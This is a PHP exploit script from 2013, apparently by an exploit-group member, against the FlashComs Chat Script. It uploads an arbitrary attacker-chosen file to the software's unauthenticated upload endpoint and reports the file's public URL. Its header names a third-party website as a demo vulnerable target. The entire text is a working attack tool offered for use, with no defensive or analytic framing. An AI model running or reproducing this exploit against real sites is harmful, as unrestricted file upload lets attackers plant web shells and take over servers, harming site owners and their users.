<?php
/*
       __            _                      _            ____            
      / /___ _____  (_)_____________ ______(_)__  _____ / __ \_________ _
 __  / / __ `/ __ \/ / ___/ ___/ __ `/ ___/ / _ \/ ___// / / / ___/ __ `/
/ /_/ / /_/ / / / / (__  |__  ) /_/ / /  / /  __(__  )/ /_/ / /  / /_/ / 
\____/\__,_/_/ /_/_/____/____/\__,_/_/  /_/\___/____(_)____/_/   \__, /  
                                                                /____/  
* FlashComs Chat Script File Upload Exploit
* Written by miyachung
* Date: 29.11.2013 , 13:38 AM
* Thanks to all janissaries members(burtay,KıLıCaRsLaN,TheMirkin,eno7,3spi0n,n4ss,mmxm,Michelony)
* Demo vulnerable website: http://www.npua.org/flashcoms/
* php exploit.php -u www.npua.org/flashcoms -f myfile.txt
*/

$options = getopt('u:f:');

if(!isset($options['u'],$options['f'])) die("\nHow to use: php $_SERVER[PHP_SELF] -u URL -f FILE_TO_UPLOAD\nExample: php $_SERVER[PHP_SELF] -u www.example.com/paths -f myfile.txt\n");

$handle = curl_init();
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
curl_setopt($handle, CURLOPT_URL, "http://".$options['u']."/common/server/php/file.php?action=upload");
curl_setopt($handle, CURLOPT_POSTFIELDS,array("Filedata" => "@".$options['f']."","fileId" => $options["f"]));
$result = curl_exec($handle);

if(strpos($result,"UPLOAD_SUCCESS")){
	echo "\n_____________________________________________________________________\n";
	echo "\t[+] Exploitation success!!\n";
	echo "\t[+] http://$options[u]/files/$options[f]\n";
	echo "_____________________________________________________________________\n";
}else{
	echo "\n[-] Target is not exploitable\n";
	preg_match('#msg="(.*?)" />#si',$result,$msg);
	echo "[-] Message: ".$msg[1]."\n";
}                              

?>